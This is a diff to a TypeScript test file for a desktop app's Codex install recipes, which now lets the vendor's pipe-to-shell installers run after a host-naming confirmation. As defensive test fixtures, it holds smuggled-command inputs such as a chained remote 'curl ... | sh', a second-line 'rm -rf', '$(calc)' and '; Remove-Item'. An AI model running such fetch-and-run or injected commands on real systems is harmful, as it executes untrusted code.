@@ -7,13 +7,26 @@
 // platform's terminal shell, and the accounts service hands it to the
 // renderer (`runLine`) only for a recipe main allows to run. PURE: the
 // service below has no registry, runs nothing and reads no file.
-import { describe, it, expect } from 'vitest'
+//
+// ADR-024 (owner decision 2026-10-10): the vendor's own installer may run
+// too, as its documented line, which names the one HTTPS address fixed in
+// code beside it, only after a confirmation that names that address's host.
+// It comes first, npm second. Every line ends its shell when its command
+// ends, so the surface that opened the tab sees it end and checks again.
+import { describe, it, expect, vi } from 'vitest'
 import { codexInstallRecipes, codexInstallKind, CODEX_INSTALL_SOURCE_URL, CODEX_README_COMMIT } from '../../src/main/providers/codex'
-import { AccountsService, ConsumerLeaseRegistry, SecretHandleStore, recipeRunLine } from '../../src/main/providers/core'
+import {
+  AccountsService, ConsumerLeaseRegistry, SecretHandleStore, recipeRunLine, installRecipeView, vendorScriptHost,
+  WINDOWS_RUN_LINE_END, POSIX_RUN_LINE_END,
+} from '../../src/main/providers/core'
 import type { InstallRecipe, ProviderPackage } from '../../src/main/providers/core'
 import type { CapabilityPlatform } from '../../src/shared/providers'
 
 const platforms = ['win32', 'darwin', 'linux'] as const
+const PS1_URL = 'https://chatgpt.com/codex/install.ps1'
+const SH_URL = 'https://chatgpt.com/codex/install.sh'
+const PS1_LINE = 'powershell -ExecutionPolicy ByPass -c "irm https://chatgpt.com/codex/install.ps1 | iex"'
+const SH_LINE = 'curl -fsSL https://chatgpt.com/codex/install.sh | sh'
 
 describe('the Codex recipe registry', () => {
   it('every platform can install and update through a package manager the user confirms', () => {
@@ -32,13 +45,23 @@ describe('the Codex recipe registry', () => {
       [...new Set(on.flatMap((p) => codexInstallRecipes(p).filter((r) => r.purpose === 'install').map((r) => r.displayCommand)))].sort()
     expect(shown(['darwin', 'linux'])).toEqual([
       'brew install --cask codex',
-      'curl -fsSL https://chatgpt.com/codex/install.sh | sh',
+      SH_LINE,
       'npm install -g @openai/codex',
     ])
     expect(shown(['win32'])).toEqual([
       'npm.cmd install -g @openai/codex',
-      'powershell -ExecutionPolicy ByPass -c "irm https://chatgpt.com/codex/install.ps1 | iex"',
+      PS1_LINE,
     ])
+  })
+
+  it("OpenAI's own installer comes first, then npm (then Homebrew on a Mac), as the README lists them", () => {
+    const ids = (p: CapabilityPlatform, purpose: 'install' | 'update') => codexInstallRecipes(p).filter((r) => r.purpose === purpose).map((r) => r.id)
+    expect(ids('win32', 'install')).toEqual(['codex-script-install-ps1', 'codex-npm-install'])
+    expect(ids('darwin', 'install')).toEqual(['codex-script-install-sh', 'codex-npm-install', 'codex-brew-install'])
+    expect(ids('linux', 'install')).toEqual(['codex-script-install-sh', 'codex-npm-install'])
+    expect(ids('win32', 'update')).toEqual(['codex-script-update-ps1', 'codex-npm-update'])
+    expect(ids('darwin', 'update')).toEqual(['codex-script-update-sh', 'codex-npm-update', 'codex-brew-update'])
+    expect(ids('linux', 'update')).toEqual(['codex-script-update-sh', 'codex-npm-update'])
   })
 
   it('Windows shows the npm install and update as npm.cmd, so Copy gives a line PowerShell runs under its default script policy; macOS and Linux show npm', () => {
@@ -50,26 +73,35 @@ describe('the Codex recipe registry', () => {
     }
   })
 
-  it('a pipe-to-shell script is shown and copied, never run by the app: it carries no argv at all', () => {
+  it("OpenAI's installer may run: as its documented line, naming its one HTTPS address fixed beside it, with no argv", () => {
     for (const p of platforms) {
-      for (const r of codexInstallRecipes(p).filter((x) => x.method === 'script')) {
-        expect(r.autoRunAllowed, r.id).toBe(false)
+      const scripts = codexInstallRecipes(p).filter((x) => x.method === 'script')
+      expect(scripts.length, p).toBe(2)
+      for (const r of scripts) {
+        const url = p === 'win32' ? PS1_URL : SH_URL
+        expect(r.autoRunAllowed, r.id).toBe(true)
         expect(r.command, r.id).toBeNull()
-        expect(r.note, r.id).toMatch(/does not run it/)
+        expect(r.scriptUrl, r.id).toBe(url)
+        expect(r.displayCommand, r.id).toBe(p === 'win32' ? PS1_LINE : SH_LINE)
+        expect(vendorScriptHost(r), r.id).toBe('chatgpt.com')
+        expect(r.mayElevate, r.id).toBe(false)
+        expect(r.note, r.id).toMatch(/downloads a script from chatgpt\.com and runs it/)
+        expect(r.note, r.id).not.toMatch(/does not run it/)
       }
     }
   })
 
-  it('what may run is a package manager, as argv with no shell and no interpolation: the displayed text split exactly, npm named npm.cmd on Windows', () => {
+  it('what may run as a package manager is argv with no shell and no interpolation: the displayed text split exactly, npm named npm.cmd on Windows', () => {
     for (const p of platforms) {
-      for (const r of codexInstallRecipes(p)) {
-        expect(r.autoRunAllowed, r.id).toBe(r.command !== null)
-        if (!r.command) continue
-        expect(['npm', 'brew'], r.id).toContain(r.command[0])
-        const [program, ...args] = r.command
+      for (const r of codexInstallRecipes(p).filter((x) => x.method === 'package-manager')) {
+        expect(r.autoRunAllowed, r.id).toBe(true)
+        expect(r.command, r.id).not.toBeNull()
+        expect(['npm', 'brew'], r.id).toContain(r.command![0])
+        const [program, ...args] = r.command!
         const named = p === 'win32' && program === 'npm' ? 'npm.cmd' : program
         expect([named, ...args].join(' '), `${p} ${r.id}`).toBe(r.displayCommand)
-        expect(r.command.every((a) => /^[A-Za-z0-9@./:_-]+$/.test(a)), r.id).toBe(true)
+        expect(r.command!.every((a) => /^[A-Za-z0-9@./:_-]+$/.test(a)), r.id).toBe(true)
+        expect(r.scriptUrl, r.id).toBeUndefined()
       }
     }
   })
@@ -131,9 +163,9 @@ describe('the update offered is the one for the install sessions run', () => {
     // shown rather than the cask upgrade, which fails on a formula.
     expect(codexInstallKind('/opt/homebrew/Cellar/codex/0.155.1/bin/codex')).toBe('unknown')
     expect(codexInstallKind('/home/linuxbrew/.linuxbrew/Cellar/codex/0.155.1/bin/codex')).toBe('unknown')
-    expect(updates('darwin', '/opt/homebrew/Cellar/codex/0.155.1/bin/codex')).toEqual(['codex-npm-update', 'codex-brew-update', 'codex-script-update-sh'])
-    expect(updates('linux', '/home/linuxbrew/.linuxbrew/Cellar/codex/0.155.1/bin/codex')).toEqual(['codex-npm-update', 'codex-script-update-sh'])
-    expect(updates('linux', '/home/u/.config/yarn/global/node_modules/@openai/codex/bin/codex.js')).toEqual(['codex-npm-update', 'codex-script-update-sh'])
+    expect(updates('darwin', '/opt/homebrew/Cellar/codex/0.155.1/bin/codex')).toEqual(['codex-script-update-sh', 'codex-npm-update', 'codex-brew-update'])
+    expect(updates('linux', '/home/linuxbrew/.linuxbrew/Cellar/codex/0.155.1/bin/codex')).toEqual(['codex-script-update-sh', 'codex-npm-update'])
+    expect(updates('linux', '/home/u/.config/yarn/global/node_modules/@openai/codex/bin/codex.js')).toEqual(['codex-script-update-sh', 'codex-npm-update'])
     // The cask still gets the cask upgrade alone.
     expect(updates('darwin', '/opt/homebrew/Caskroom/codex/0.155.1/codex-aarch64-apple-darwin')).toEqual(['codex-brew-update'])
   })
@@ -144,11 +176,11 @@ describe('the update offered is the one for the install sessions run', () => {
     expect(updates('win32', 'C:\\Users\\u\\AppData\\Roaming\\npm\\codex.cmd')).toEqual(['codex-npm-update'])
     expect(updates('darwin', '/opt/homebrew/Caskroom/codex/0.155.1/codex')).toEqual(['codex-brew-update'])
     // Not known, or not resolved yet: every update, each saying which install it updates.
-    expect(updates('win32', 'C:\\Tools\\codex.exe')).toEqual(['codex-npm-update', 'codex-script-update-ps1'])
-    expect(updates('darwin')).toEqual(['codex-npm-update', 'codex-brew-update', 'codex-script-update-sh'])
+    expect(updates('win32', 'C:\\Tools\\codex.exe')).toEqual(['codex-script-update-ps1', 'codex-npm-update'])
+    expect(updates('darwin')).toEqual(['codex-script-update-sh', 'codex-npm-update', 'codex-brew-update'])
     // The installs never change with it.
     for (const exe of [STANDALONE_WIN, undefined]) {
-      expect(codexInstallRecipes('win32', exe ? { executable: exe } : {}).filter((r) => r.purpose === 'install').map((r) => r.id)).toEqual(['codex-npm-install', 'codex-script-install-ps1'])
+      expect(codexInstallRecipes('win32', exe ? { executable: exe } : {}).filter((r) => r.purpose === 'install').map((r) => r.id)).toEqual(['codex-script-install-ps1', 'codex-npm-install'])
     }
   })
 
@@ -161,49 +193,86 @@ describe('the update offered is the one for the install sessions run', () => {
     expect(codexInstallRecipes('darwin').find((r) => r.id === 'codex-brew-update')!.note).toBe('Updates a Homebrew cask (not a formula).')
   })
 
-  it('the standalone update is the installer, shown and copied, never run by the app', () => {
+  it("the standalone update is OpenAI's installer, run again through its documented line", () => {
     const r = codexInstallRecipes('win32', { executable: STANDALONE_WIN }).find((x) => x.purpose === 'update')!
-    expect(r).toMatchObject({ method: 'script', command: null, autoRunAllowed: false })
+    expect(r).toMatchObject({ method: 'script', command: null, autoRunAllowed: true, scriptUrl: PS1_URL })
     expect(r.displayCommand).toBe(codexInstallRecipes('win32').find((x) => x.id === 'codex-script-install-ps1')!.displayCommand)
     expect(r.note).toMatch(/Updates a Codex this script installed/)
-    expect(recipeRunLine(r, 'win32')).toBeUndefined()
+    expect(recipeRunLine(r, 'win32')).toBe(`${PS1_LINE}; exit $LASTEXITCODE`)
     // Walk fix W8: the same for the sh installer, on both platforms it runs on.
     for (const p of ['darwin', 'linux'] as const) {
       const sh = codexInstallRecipes(p, { executable: '/Users/u/.codex/packages/standalone/current/bin/codex' }).find((x) => x.purpose === 'update')!
       expect(sh.id).toBe('codex-script-update-sh')
-      expect(sh).toMatchObject({ method: 'script', command: null, autoRunAllowed: false })
+      expect(sh).toMatchObject({ method: 'script', command: null, autoRunAllowed: true, scriptUrl: SH_URL })
       expect(sh.displayCommand).toBe(codexInstallRecipes(p).find((x) => x.id === 'codex-script-install-sh')!.displayCommand)
-      expect(sh.displayCommand).toBe('curl -fsSL https://chatgpt.com/codex/install.sh | sh')
+      expect(sh.displayCommand).toBe(SH_LINE)
       expect(sh.note).toMatch(/Updates a Codex this script installed/)
-      expect(recipeRunLine(sh, p)).toBeUndefined()
+      expect(recipeRunLine(sh, p)).toBe(`${SH_LINE}; exit`)
     }
   })
 })
 
 // --- WP2 commit 6e review fix: the line the terminal tab types --------------
 
-type Runnable = Pick<InstallRecipe, 'method' | 'autoRunAllowed' | 'command'>
+type Runnable = Pick<InstallRecipe, 'method' | 'autoRunAllowed' | 'command'> & Partial<Pick<InstallRecipe, 'displayCommand' | 'scriptUrl'>>
 const recipe = (over: Partial<Runnable> = {}): Runnable => ({ method: 'package-manager', autoRunAllowed: true, command: ['npm', 'install', '-g', '@openai/codex'], ...over })
+const script = (over: Partial<Runnable> = {}): Runnable => ({ method: 'script', autoRunAllowed: true, command: null, displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh', scriptUrl: 'https://vendor.example/install.sh', ...over })
 const byId = (p: CapabilityPlatform, id: string) => codexInstallRecipes(p).find((r) => r.id === id)!
 
 describe('recipeRunLine: what a terminal tab may type for a recipe', () => {
   it('Windows: npm is typed as npm.cmd (PowerShell would load npm.ps1, which the default execution policy refuses), every argument single-quoted', () => {
-    expect(recipeRunLine(byId('win32', 'codex-npm-install'), 'win32')).toBe("npm.cmd 'install' '-g' '@openai/codex'")
-    expect(recipeRunLine(byId('win32', 'codex-npm-update'), 'win32')).toBe("npm.cmd 'install' '-g' '@openai/codex@latest'")
+    expect(recipeRunLine(byId('win32', 'codex-npm-install'), 'win32')).toBe("npm.cmd 'install' '-g' '@openai/codex'; exit $LASTEXITCODE")
+    expect(recipeRunLine(byId('win32', 'codex-npm-update'), 'win32')).toBe("npm.cmd 'install' '-g' '@openai/codex@latest'; exit $LASTEXITCODE")
   })
 
   it('macOS and Linux: npm unchanged, arguments single-quoted; brew on macOS', () => {
     for (const p of ['darwin', 'linux'] as const) {
-      expect(recipeRunLine(byId(p, 'codex-npm-install'), p), p).toBe("npm 'install' '-g' '@openai/codex'")
-      expect(recipeRunLine(byId(p, 'codex-npm-update'), p), p).toBe("npm 'install' '-g' '@openai/codex@latest'")
+      expect(recipeRunLine(byId(p, 'codex-npm-install'), p), p).toBe("npm 'install' '-g' '@openai/codex'; exit")
+      expect(recipeRunLine(byId(p, 'codex-npm-update'), p), p).toBe("npm 'install' '-g' '@openai/codex@latest'; exit")
     }
-    expect(recipeRunLine(byId('darwin', 'codex-brew-install'), 'darwin')).toBe("brew 'install' '--cask' 'codex'")
-    expect(recipeRunLine(byId('darwin', 'codex-brew-update'), 'darwin')).toBe("brew 'upgrade' '--cask' 'codex'")
+    expect(recipeRunLine(byId('darwin', 'codex-brew-install'), 'darwin')).toBe("brew 'install' '--cask' 'codex'; exit")
+    expect(recipeRunLine(byId('darwin', 'codex-brew-update'), 'darwin')).toBe("brew 'upgrade' '--cask' 'codex'; exit")
   })
 
-  it('a script recipe gets no line on any platform', () => {
+  it('every line ends its shell when its command ends (PowerShell with the exit code), once, so the tab is seen to end', () => {
+    expect(WINDOWS_RUN_LINE_END).toBe('; exit $LASTEXITCODE')
+    expect(POSIX_RUN_LINE_END).toBe('; exit')
     for (const p of platforms) {
-      for (const r of codexInstallRecipes(p).filter((x) => x.method === 'script')) expect(recipeRunLine(r, p), r.id).toBeUndefined()
+      const end = p === 'win32' ? WINDOWS_RUN_LINE_END : POSIX_RUN_LINE_END
+      for (const r of codexInstallRecipes(p)) {
+        const line = recipeRunLine(r, p)!
+        expect(line, `${p} ${r.id}`).toBeDefined()
+        expect(line.endsWith(end), `${p} ${r.id}`).toBe(true)
+        expect(line.split('; exit').length, `${p} ${r.id}`).toBe(2)
+      }
+    }
+  })
+
+  it("OpenAI's installer is typed as the README writes it, character for character, then ended the same way", () => {
+    expect(recipeRunLine(byId('win32', 'codex-script-install-ps1'), 'win32')).toBe(`${PS1_LINE}; exit $LASTEXITCODE`)
+    for (const p of ['darwin', 'linux'] as const) expect(recipeRunLine(byId(p, 'codex-script-install-sh'), p), p).toBe(`${SH_LINE}; exit`)
+  })
+
+  it('a script gets a line only when its documented line names exactly its one fixed https address', () => {
+    expect(recipeRunLine(script(), 'linux')).toBe('curl -fsSL https://vendor.example/install.sh | sh; exit')
+    expect(vendorScriptHost(script())).toBe('vendor.example')
+    const refused: Array<[string, Partial<Runnable>]> = [
+      ['no fixed address', { scriptUrl: undefined }],
+      ['not https', { scriptUrl: 'http://vendor.example/install.sh', displayCommand: 'curl -fsSL http://vendor.example/install.sh | sh' }],
+      ['the line names another address', { displayCommand: 'curl -fsSL https://elsewhere.example/install.sh | sh' }],
+      ['the line names a second address', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh; curl https://elsewhere.example/x | sh' }],
+      ['the address hides in a longer one', { displayCommand: 'curl -fsSL https://vendor.example/install.sh.evil | sh' }],
+      ['an address with a user', { scriptUrl: 'https://u@vendor.example/install.sh', displayCommand: 'curl https://u@vendor.example/install.sh | sh' }],
+      ['an address with a port', { scriptUrl: 'https://vendor.example:8443/install.sh', displayCommand: 'curl https://vendor.example:8443/install.sh | sh' }],
+      ['an address with a query', { scriptUrl: 'https://vendor.example/install.sh?x=1', displayCommand: 'curl https://vendor.example/install.sh?x=1 | sh' }],
+      ['a second line', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh\nrm -rf x' }],
+      ['a control character', { displayCommand: 'curl -fsSL https://vendor.example/install.sh | sh' + String.fromCharCode(27) }],
+      ['not allowed to run', { autoRunAllowed: false }],
+      ['an installer, not a script', { method: 'installer' }],
+    ]
+    for (const [why, over] of refused) {
+      expect(recipeRunLine(script(over), 'linux'), why).toBeUndefined()
+      expect(recipeRunLine(script(over), 'win32'), why).toBeUndefined()
     }
   })
 
@@ -219,7 +288,7 @@ describe('recipeRunLine: what a terminal tab may type for a recipe', () => {
 
   it('built from the argv, never from the text the user is shown', () => {
     const shown = { ...byId('win32', 'codex-npm-install'), displayCommand: 'npm install -g @openai/codex; Remove-Item x' }
-    expect(recipeRunLine(shown, 'win32')).toBe("npm.cmd 'install' '-g' '@openai/codex'")
+    expect(recipeRunLine(shown, 'win32')).toBe("npm.cmd 'install' '-g' '@openai/codex'; exit $LASTEXITCODE")
   })
 
   it('the program must be a plain word typed bare; anything else gets no line', () => {
@@ -229,15 +298,15 @@ describe('recipeRunLine: what a terminal tab may type for a recipe', () => {
   })
 
   it('an argument is literal in that shell: quotes escaped, nothing expanded', () => {
-    expect(recipeRunLine(recipe({ command: ['npm', "it's", '$(calc)', '@x/y'] }), 'win32')).toBe("npm.cmd 'it''s' '$(calc)' '@x/y'")
+    expect(recipeRunLine(recipe({ command: ['npm', "it's", '$(calc)', '@x/y'] }), 'win32')).toBe("npm.cmd 'it''s' '$(calc)' '@x/y'; exit $LASTEXITCODE")
     // POSIX: a single quote closes, is escaped, and reopens: 'it'\''s'.
     const BS = String.fromCharCode(92)
-    expect(recipeRunLine(recipe({ command: ['npm', "it's", '$(calc)', '@x/y'] }), 'linux')).toBe(`npm 'it'${BS}''s' '$(calc)' '@x/y'`)
+    expect(recipeRunLine(recipe({ command: ['npm', "it's", '$(calc)', '@x/y'] }), 'linux')).toBe(`npm 'it'${BS}''s' '$(calc)' '@x/y'; exit`)
   })
 })
 
 describe('the accounts service hands the renderer a line only for a recipe main allows to run', () => {
-  const serviceOn = (platform: CapabilityPlatform, recipes: (p: CapabilityPlatform) => readonly InstallRecipe[] = codexInstallRecipes) => {
+  const serviceOn = (platform: CapabilityPlatform, recipes: (p: CapabilityPlatform) => readonly InstallRecipe[] = codexInstallRecipes, nodeToolsFound?: () => Promise<boolean>) => {
     const pkg = {
       id: 'codex',
       setup: { discover: async () => ({ state: 'missing', compatibility: 'unknown', checkedAt: 0 }), installRecipes: recipes },
@@ -250,10 +319,11 @@ describe('the accounts service hands the renderer a line only for a recipe main 
       preference: () => 'on',
       platform,
       randomHex: () => '0'.repeat(32),
+      ...(nodeToolsFound ? { nodeToolsFound } : {}),
     })
   }
 
-  it('each platform: a line exactly for the runnable recipes, built for that platform; the shown command verbatim; never an argv', () => {
+  it('each platform: a line for every runnable recipe, built for that platform; the shown command verbatim; never an argv', () => {
     for (const p of platforms) {
       const views = serviceOn(p).installRecipes('codex')
       const source = codexInstallRecipes(p)
@@ -262,13 +332,19 @@ describe('the accounts service hands the renderer a line only for a recipe main 
         const r = source.find((x) => x.id === v.id)!
         expect(v.displayCommand, v.id).toBe(r.displayCommand)
         expect('command' in v, v.id).toBe(false)
-        if (r.method === 'package-manager' && r.autoRunAllowed && r.command) expect(v.runLine, `${p} ${v.id}`).toBe(recipeRunLine(r, p))
-        else expect('runLine' in v, `${p} ${v.id}`).toBe(false)
+        expect('scriptUrl' in v, v.id).toBe(false)
+        expect(v.runLine, `${p} ${v.id}`).toBe(recipeRunLine(r, p))
+        expect(v.runLine, `${p} ${v.id}`).toBeDefined()
+        // The installer names where it downloads from, for the confirmation.
+        if (r.method === 'script') expect(v.downloadsFrom, v.id).toBe('chatgpt.com')
+        else expect('downloadsFrom' in v, v.id).toBe(false)
+        expect('needsNode' in v, v.id).toBe(false)
+        expect(v).toEqual(installRecipeView(r, p))
       }
     }
     const win = serviceOn('win32').installRecipes('codex')
-    expect(win.find((v) => v.id === 'codex-npm-install')!.runLine).toBe("npm.cmd 'install' '-g' '@openai/codex'")
-    expect(win.find((v) => v.id === 'codex-script-install-ps1')!.runLine).toBeUndefined()
+    expect(win.find((v) => v.id === 'codex-npm-install')!.runLine).toBe("npm.cmd 'install' '-g' '@openai/codex'; exit $LASTEXITCODE")
+    expect(win.find((v) => v.id === 'codex-script-install-ps1')!.runLine).toBe(`${PS1_LINE}; exit $LASTEXITCODE`)
   })
 
   it('the update the service hands over is the one for the install its last check resolved (the path stays in main)', async () => {
@@ -285,15 +361,52 @@ describe('the accounts service hands the renderer a line only for a recipe main 
       packages: () => [pkg], preference: () => 'on', platform: 'win32', randomHex: () => '0'.repeat(32),
     })
     // Before any check: every update.
-    expect(svc.installRecipes('codex').filter((v) => v.purpose === 'update').map((v) => v.id)).toEqual(['codex-npm-update', 'codex-script-update-ps1'])
+    expect(svc.installRecipes('codex').filter((v) => v.purpose === 'update').map((v) => v.id)).toEqual(['codex-script-update-ps1', 'codex-npm-update'])
     expect((await svc.discover('codex')).ok).toBe(true)
     const after = svc.installRecipes('codex')
     expect(after.filter((v) => v.purpose === 'update').map((v) => v.id)).toEqual(['codex-script-update-ps1'])
     expect(JSON.stringify(after)).not.toContain('packages')
   })
 
-  it('a recipe that says it may run but carries no argv gets no line', () => {
-    const noArgv = (p: CapabilityPlatform) => codexInstallRecipes(p).map((r) => ({ ...r, command: null }))
-    for (const v of serviceOn('win32', noArgv).installRecipes('codex')) expect('runLine' in v, v.id).toBe(false)
+  it('a package-manager recipe that says it may run but carries no argv gets no line', () => {
+    const noArgv = (p: CapabilityPlatform) => codexInstallRecipes(p).map((r) => (r.method === 'package-manager' ? { ...r, command: null } : r))
+    for (const v of serviceOn('win32', noArgv).installRecipes('codex')) {
+      if (v.method === 'package-manager') expect('runLine' in v, v.id).toBe(false)
+    }
+  })
+
+  it('Node.js not found: every npm recipe says so and keeps its line; nothing else is marked', () => {
+    for (const p of platforms) {
+      for (const v of serviceOn(p).installRecipes('codex', { nodeFound: false })) {
+        const npm = v.id.startsWith('codex-npm-')
+        expect(v.needsNode === true, `${p} ${v.id}`).toBe(npm)
+        expect(v.runLine, `${p} ${v.id}`).toBeDefined()
+      }
+    }
+  })
+
+  it('Node.js found, or not asked: the list is exactly as before', () => {
+    for (const p of platforms) {
+      const plain = serviceOn(p).installRecipes('codex')
+      expect(serviceOn(p).installRecipes('codex', { nodeFound: true }), p).toEqual(plain)
+      expect(plain.some((v) => 'needsNode' in v), p).toBe(false)
+    }
+  })
+
+  it('the checked list asks for Node.js only when a recipe runs npm, and a check that fails changes nothing', async () => {
+    const found = vi.fn(async () => false)
+    const scriptsOnly = (p: CapabilityPlatform) => codexInstallRecipes(p).filter((r) => r.method === 'script')
+    expect((await serviceOn('win32', scriptsOnly, found).installRecipesChecked('codex')).some((v) => v.needsNode)).toBe(false)
+    expect(found).not.toHaveBeenCalled()
+
+    const marked = await serviceOn('win32', codexInstallRecipes, found).installRecipesChecked('codex')
+    expect(found).toHaveBeenCalledTimes(1)
+    expect(marked.filter((v) => v.needsNode).map((v) => v.id)).toEqual(['codex-npm-install', 'codex-npm-update'])
+
+    const throws = vi.fn(async () => { throw new Error('no answer') })
+    const plain = await serviceOn('win32', codexInstallRecipes, throws).installRecipesChecked('codex')
+    expect(throws).toHaveBeenCalledTimes(1)
+    expect(plain).toEqual(serviceOn('win32').installRecipes('codex'))
+    expect(await serviceOn('win32', codexInstallRecipes, async () => true).installRecipesChecked('codex')).toEqual(plain)
   })
 })
